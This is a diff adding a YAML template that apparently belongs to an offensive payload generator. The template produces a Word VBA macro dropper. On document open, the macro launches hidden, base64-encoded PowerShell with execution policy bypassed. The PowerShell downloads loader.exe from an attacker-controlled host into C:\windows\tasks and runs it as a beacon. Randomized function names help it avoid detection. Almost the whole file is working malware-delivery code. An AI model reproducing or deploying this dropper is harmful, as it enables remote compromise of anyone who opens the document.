@@ -1,0 +1,36 @@
+description: "VBA Macro for Powershell dropping beacons"
+variables:
+  outputdir: "output"
+  vbaFile: "powershell-dropper.vba"
+  revshellFile: "loader.exe"
+  port: 80
+templates:
+  powershell:
+    variables:
+      command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\db.exe;Start-Process -FilePath C:\\windows\\tasks\\db.exe"
+      payload_fn: "{{ Helpers.random_str() }}"
+      wsh_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{wsh_fn}}
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        {{wsh_fn}}.Run "powershell -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}"
+        Set {{wsh_fn}} = Nothing
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+print:
+- "Generating a vba payload for basic powershell reflective loading of a beacon"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('powershell')}}
+  EOF
